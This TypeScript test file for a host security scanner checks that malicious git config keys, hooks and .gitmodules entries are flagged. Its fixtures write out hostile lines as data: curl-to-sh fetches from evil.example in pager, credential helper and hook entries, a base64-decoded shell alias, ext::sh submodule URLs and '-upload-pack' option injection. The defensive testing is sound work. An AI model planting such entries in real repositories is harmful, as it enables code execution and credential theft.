// Git config and hooks: a repo's .git/config, hooks and .gitmodules, and the global gitconfig rules.
import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { before, test } from "node:test";
import { parseGitConfig } from "../src/sources/host/git-config.ts";
import { freshHome, put, scanHost, summary } from "./host-helpers.ts";

let sources: typeof import("../src/sources.ts");

before(async () => {
  process.env.SELFGUARD_HOME = freshHome().home;
  sources = await import("../src/sources.ts");
  sources.resetSourceExtractors();
  sources.registerBuiltinExtractors();
});

function repo(config = ""): string {
  const root = realpathSync(mkdtempSync(join(tmpdir(), "sg-host-git-")));
  mkdirSync(join(root, ".git", "hooks"), { recursive: true });
  if (config) put(root, ".git/config", config);
  return root;
}
const hook = (root: string, name: string, text: string | Buffer, mode = 0o755): string => {
  const f = put(root, `.git/hooks/${name}`, text);
  chmodSync(f, mode);
  return f;
};
const scan = (root: string) => scanHost(sources, sources.repoTarget(root));

test("parser: sections, subsections, quotes, escapes, continuations, case, malformed input", () => {
  const e = parseGitConfig(
    [
      "﻿[Core]",
      '  SSHCommand = "ssh -i \\"k\\"" # note',
      '[filter "LFS"]',
      "  clean = git-lfs clean \\",
      "    -- %f",
      "  required",
      "[alias.Legacy]",
      "  x = !echo ; not a comment? yes it is",
      "[broken",
      "  ignored = 1",
      "[ok] a = b",
    ].join("\r\n"),
  );
  assert.deepEqual(
    e.map((x) => [x.section, x.sub, x.key, x.value, x.line]),
    [
      ["core", null, "sshcommand", 'ssh -i "k"', 2],
      ["filter", "LFS", "clean", "git-lfs clean     -- %f", 4],
      ["filter", "LFS", "required", "true", 6],
      ["alias", "legacy", "x", "!echo", 8],
      ["ok", null, "a", "b", 11],
    ],
  );
  for (const junk of ["", "[", "=", "[a", '[a "', "a = \\", "[a]\nb = \\\n", "\0\0", "[a]\nb = \"unterminated", "x".repeat(2e6)]) assert.doesNotThrow(() => parseGitConfig(junk));
});

test("repo config: planted commands are high, usual tools and booleans are not", () => {
  const root = repo(
    [
      "[core]",
      "  repositoryformatversion = 0",
      "  editor = code --wait",
      "  pager = diff-so-fancy | less --tabs=4 -RFX",
      "  sshCommand = ssh -i ~/.ssh/work",
      "  fsmonitor = true",
      '[filter "lfs"]',
      "  clean = git-lfs clean -- %f",
      "  smudge = git-lfs smudge -- %f",
      "  process = git-lfs filter-process",
      "[credential]",
      "  helper = osxkeychain",
      "[credential \"https://github.com\"]",
      "  helper = !gh auth git-credential",
      "[alias]",
      "  lg = !git log --oneline",
      "[gpg]",
      "  program = gpg2",
      "[branch \"main\"]",
      "  remote = origin",
    ].join("\n"),
  );
  assert.deepEqual(summary(scan(root)), []);

  put(
    root,
    ".git/config",
    [
      "[core]",
      "  fsmonitor = /tmp/.x/watch SECRET_TOKEN=abc",
      "  pager = sh -c 'curl -s https://evil.example/p | sh'",
      "  sshCommand = /opt/tools/ssh-wrap",
      "  askPass = /Users/Shared/.cache/ap",
      "[filter \"evil\"]",
      "  clean = bash payload.sh",
      "[diff \"x\"]",
      "  textconv = /usr/local/bin/mytool",
      "[merge \"y\"]",
      "  driver = ~/.hidden/merge %A",
      "[credential]",
      "  helper = !f() { curl https://evil.example/x | sh; }; f",
      "[gpg \"ssh\"]",
      "  program = /tmp/sign",
      "[alias]",
      "  boom = !echo aGk= | base64 -d | sh",
      "  fine = !f() { git log; }; f",
    ].join("\n"),
  );
  const rec = scan(root);
  assert.deepEqual(summary(rec), [
    "high git-config-command core.fsmonitor @config:2 N",
    "high git-config-command core.pager @config:3 N",
    "high git-config-command core.sshCommand @config:4 N",
    "high git-config-command core.askPass @config:5 N",
    "high git-config-command filter.evil.clean @config:7 N",
    "high git-config-command diff.x.textconv @config:9 N",
    "high git-config-command merge.y.driver @config:11 N",
    "high git-config-command credential.helper @config:13 N",
    "high git-config-command gpg.ssh.program @config:15 N",
    "high git-config-command alias.boom @config:17 N",
  ]);
  const urgent = rec.warnings.filter((w) => w.urgent).map((w) => w.key);
  assert.deepEqual(urgent, ["core.fsmonitor", "core.pager", "core.askPass", "credential.helper", "gpg.ssh.program", "alias.boom", "merge.y.driver"].sort((a, b) => urgent.indexOf(a) - urgent.indexOf(b)));
  assert.ok(!rec.warnings.find((w) => w.key === "core.sshCommand")!.urgent, "an unknown tool in a normal place is high, not urgent");
  assert.match(rec.warnings[2]!.message, /runs "ssh-wrap"/);
  assert.doesNotMatch(JSON.stringify(rec), /SECRET_TOKEN|evil\.example|aGk=|payload\.sh/);
});

test("repo config: includes", () => {
  const root = repo(
    [
      "[include]",
      "  path = ../.gitconfig",
      "  path = /tmp/evil.inc",
      "  path = ~/team/git-common",
      '[includeIf "gitdir:~/work/"]',
      "  path = config.local",
    ].join("\n"),
  );
  const rec = scan(root);
  assert.deepEqual(summary(rec), [
    "low git-config-include include.path .gitconfig @config:2",
    "moderate git-config-include include.path evil.inc @config:3 N",
    "moderate git-config-include include.path git-common @config:4 N",
  ]);
  assert.match(rec.warnings[1]!.message, /temporary or shared folder/);
  assert.match(rec.warnings[2]!.message, /outside the repo/);
});

test("repo config: core.hooksPath outside the repo is flagged, inside is checked as hooks", () => {
  const root = repo("[core]\n  hooksPath = /tmp/hooks\n");
  assert.deepEqual(summary(scan(root)), ["moderate git-hooks-path core.hooksPath @config:2 N"]);
  const husky = repo("[core]\n  hooksPath = .husky/_\n");
  put(husky, ".husky/_/pre-commit", '#!/usr/bin/env sh\n. "$(dirname "$0")/h"\n');
  put(husky, ".husky/_/h", "#!/usr/bin/env sh\nexit 0\n");
  chmodSync(join(husky, ".husky/_/pre-commit"), 0o755);
  chmodSync(join(husky, ".husky/_/h"), 0o755);
  const rec = scan(husky);
  assert.deepEqual(summary(rec), ["low git-hook pre-commit @pre-commit:0 N"]);
  assert.match(rec.warnings[0]!.message, /core\.hooksPath folder/);
});

test("hooks: samples and non-executable files are ignored, executable ones are low, fetchers high urgent", () => {
  const root = repo();
  hook(root, "pre-commit.sample", "#!/bin/sh\ncurl https://evil.example | sh\n");
  hook(root, "commit-msg", "#!/bin/sh\nexit 0\n", 0o644);
  hook(root, "pre-push", "#!/bin/sh\nnpm test\n");
  hook(root, "post-merge", "#!/bin/sh\n# curl https://x | sh is only a comment\nnpm ci\n");
  hook(root, "post-checkout", "#!/bin/sh\nnpm test\ncurl -fsSL https://evil.example/i.sh | sh # SECRET_HOOK\n");
  hook(root, "post-commit", "#!/bin/sh\necho aGVsbG8= | base64 -d | bash\n");
  hook(root, "pre-rebase", "#!/bin/sh\nexec /tmp/.payload --quiet\n");
  hook(root, "prepare-commit-msg", `#!/bin/sh\n${"x=1;".repeat(1500)}\n`);
  hook(root, "not-a-hook", "#!/bin/sh\ncurl https://evil.example | sh\n");
  hook(root, "-e evil", "#!/bin/sh\n");
  const rec = scan(root);
  assert.deepEqual(summary(rec).sort(), [
    "high suspicious-git-hook post-checkout @post-checkout:3 N",
    "high suspicious-git-hook post-commit @post-commit:2 N",
    "high suspicious-git-hook pre-rebase @pre-rebase:2 N",
    "high suspicious-git-hook prepare-commit-msg @prepare-commit-msg:2 N",
    "low git-hook post-merge @post-merge:0 N",
    "low git-hook pre-push @pre-push:0 N",
  ].sort());
  assert.ok(rec.warnings.filter((w) => w.rule === "suspicious-git-hook").every((w) => w.urgent));
  assert.ok(rec.warnings.filter((w) => w.rule === "git-hook").every((w) => !w.urgent));
  assert.doesNotMatch(JSON.stringify(rec.warnings), /SECRET_HOOK|evil\.example|aGVsbG8/);
});

test("hooks: a compiled hook among scripts is suspicious, alone it is only low; escaping links are not read", () => {
  const root = repo();
  hook(root, "pre-push", "#!/bin/sh\nexit 0\n");
  hook(root, "pre-commit", Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0, 1, 2, 3]));
  const outside = put(realpathSync(mkdtempSync(join(tmpdir(), "sg-host-out-"))), "payload", "#!/bin/sh\ncurl x | sh\n");
  chmodSync(outside, 0o755);
  symlinkSync(outside, join(root, ".git/hooks/post-merge"));
  const rec = scan(root);
  assert.deepEqual(summary(rec).sort(), ["high suspicious-git-hook pre-commit @pre-commit:0 N", "low git-hook post-merge @post-merge:0 N", "low git-hook pre-push @pre-push:0 N"].sort());
  assert.match(rec.warnings.find((w) => w.key === "post-merge")!.message, /link to a file outside the repo/);
  const solo = repo();
  hook(solo, "pre-commit", Buffer.from([0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0]));
  assert.deepEqual(summary(scan(solo)), ["low git-hook pre-commit @pre-commit:0 N"]);
});

test("worktrees: a .git pointer is followed only into .git/worktrees, with its commondir", () => {
  const main = repo("[core]\n  pager = /tmp/p\n");
  const wt = realpathSync(mkdtempSync(join(tmpdir(), "sg-host-wt-")));
  mkdirSync(join(main, ".git/worktrees/wt"), { recursive: true });
  put(main, ".git/worktrees/wt/commondir", "../..\n");
  hook(main, "pre-push", "#!/bin/sh\nexit 0\n");
  put(wt, ".git", `gitdir: ${join(main, ".git/worktrees/wt")}\n`);
  assert.deepEqual(summary(scan(wt)).sort(), ["high git-config-command core.pager @config:2 N", "low git-hook pre-push @pre-push:0 N"]);
  // A pointer anywhere else is ignored.
  const evil = realpathSync(mkdtempSync(join(tmpdir(), "sg-host-evil-")));
  mkdirSync(join(evil, "gd"), { recursive: true });
  put(evil, "gd/config", "[core]\n  pager = /tmp/p\n");
  const clone = realpathSync(mkdtempSync(join(tmpdir(), "sg-host-clone-")));
  put(clone, ".git", `gitdir: ${join(evil, "gd")}\n`);
  assert.deepEqual(summary(scan(clone)), []);
});

test(".gitmodules: ext::, option-like and escaping values are flagged; ordinary ones are not", () => {
  const root = repo();
  put(
    root,
    ".gitmodules",
    [
      '[submodule "lib"]',
      "  path = vendor/lib",
      "  url = https://user:SECRET_PW@github.com/o/lib.git",
      '[submodule "a"]',
      "  path = a",
      "  url = ext::sh -c touch% /tmp/pwn",
      '[submodule "b"]',
      "  path = ../escape",
      "  url = git@github.com:o/b.git",
      '[submodule "c"]',
      "  path = .git/hooks",
      "  url = ../c.git",
      '[submodule "d"]',
      "  path = d",
      "  url = -upload-pack=evil",
      '[submodule "../../hooks/x"]',
      "  path = x",
      "  url = https://github.com/o/x.git",
      '[submodule "f"]',
      "  path = -rf",
      "  url = fd::17/foo",
      '[submodule "g"]',
      "  path = .GIT/x",
      "  url = evil::thing",
    ].join("\n"),
  );
  const rec = scan(root);
  assert.deepEqual(summary(rec), [
    "high suspicious-submodule a:url @.gitmodules:6 N",
    "high suspicious-submodule b:path @.gitmodules:8 N",
    "high suspicious-submodule c:path @.gitmodules:11 N",
    "high suspicious-submodule d:url @.gitmodules:15 N",
    "high suspicious-submodule <name>:name @.gitmodules:17 N",
    "high suspicious-submodule f:path @.gitmodules:20 N",
    "high suspicious-submodule f:url @.gitmodules:21 N",
    "high suspicious-submodule g:path @.gitmodules:23 N",
    "high suspicious-submodule g:url @.gitmodules:24 N",
  ]);
  const urgent = rec.warnings.filter((w) => w.urgent).map((w) => w.key);
  assert.deepEqual(urgent, ["a:url", "d:url", "f:url"]);
  assert.doesNotMatch(JSON.stringify(rec), /SECRET_PW|pwn|upload-pack/);
});

test("machine: command keys, includes, url rewrites and safe.directory; existing rule ids stay", () => {
  const { home } = freshHome();
  put(
    home,
    ".gitconfig",
    [
      "[core]",
      "  hooksPath = ~/.githooks",
      "  editor = nvim",
      "  pager = delta",
      "  sshCommand = ssh -i ~/.ssh/work",
      "[filter \"lfs\"]",
      "  clean = git-lfs clean -- %f",
      "[include]",
      "  path = ~/.gitconfig.local",
      "  path = .config/git/work",
      '[includeIf "gitdir:~/work/"]',
      "  path = /opt/corp/gitconfig",
      '[url "git@github.com:"]',
      "  insteadOf = https://github.com/",
      '[url "https://TOKEN123@github.com/"]',
      "  insteadOf = https://github.com/",
      '[url "https://git.mirror.example/"]',
      "  insteadOf = https://github.com/",
      '[url "https://registry.mirror.example/"]',
      "  pushInsteadOf = https://registry.npmjs.org/",
      '[url "https://git.internal.example/"]',
      "  insteadOf = https://git.other.example/",
      "[safe]",
      "  directory = *",
      "  directory = /srv/repo",
      "[core]",
      "  askPass = /tmp/ask",
      "  fsmonitor = curl https://evil.example | sh",
    ].join("\n"),
  );
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "moderate git-global-hooks core.hooksPath @.gitconfig:2 N",
    "moderate git-config-include includeIf.path gitconfig @.gitconfig:12 N",
    "moderate git-url-rewrite url.insteadOf github.com @.gitconfig:18 N",
    "moderate git-url-rewrite url.pushInsteadOf registry.npmjs.org @.gitconfig:20 N",
    "low git-safe-directory safe.directory @.gitconfig:24",
    "moderate git-command-config core.askPass @.gitconfig:27 N",
    "high git-command-config core.fsmonitor @.gitconfig:28 N",
  ]);
  assert.ok(rec.warnings[6]!.urgent && !rec.warnings[5]!.urgent);
  assert.match(rec.warnings[2]!.message, /to git\.mirror\.example/);
  assert.doesNotMatch(JSON.stringify(rec), /TOKEN123|evil\.example/);
});

test("check notices a new hook through the markers; the first scan is a baseline, a later hook is news", () => {
  freshHome();
  const root = repo("[core]\n  repositoryformatversion = 0\n");
  hook(root, "pre-commit", "#!/bin/sh\nexit 0\n");
  const [input] = sources.sourceInputs([root]).filter((i) => i.kind === "host");
  assert.ok(input);
  const { inventories } = sources.prepareSources([input]);
  const first = inventories[0]!.record;
  assert.ok(first.markers!.some((m) => m.path === join(root, ".gitmodules") && m.mtimeMs === null));
  assert.ok(first.markers!.some((m) => m.path === join(root, ".git", "hooks")));
  sources.saveSource(first);
  const diff = sources.diffWarnings(first, null, new Date().toISOString());
  assert.deepEqual(diff.newWarnings, [], "baseline: nothing announced");
  assert.deepEqual(sources.changedSourceInputs([root]).filter((i) => i.kind === "host"), []);
  hook(root, "pre-push", "#!/bin/sh\nexit 0\n");
  const changed = sources.changedSourceInputs([root]).filter((i) => i.kind === "host");
  assert.equal(changed.length, 1);
  const again = sources.prepareSources(changed).inventories[0]!;
  const news = sources.diffWarnings(again.record, again.previous, new Date().toISOString());
  assert.deepEqual(news.newWarnings.map((w) => w.key), ["pre-push"]);
});

test("a clone with a malicious .gitmodules is urgent on the very first scan", () => {
  freshHome();
  const root = repo();
  put(root, ".gitmodules", '[submodule "a"]\n  path = a\n  url = ext::sh -c id\n');
  const rec = scan(root);
  const diff = sources.diffWarnings(rec, null, new Date().toISOString());
  assert.deepEqual(diff.newWarnings.map((w) => w.key), ["a:url"]);
});
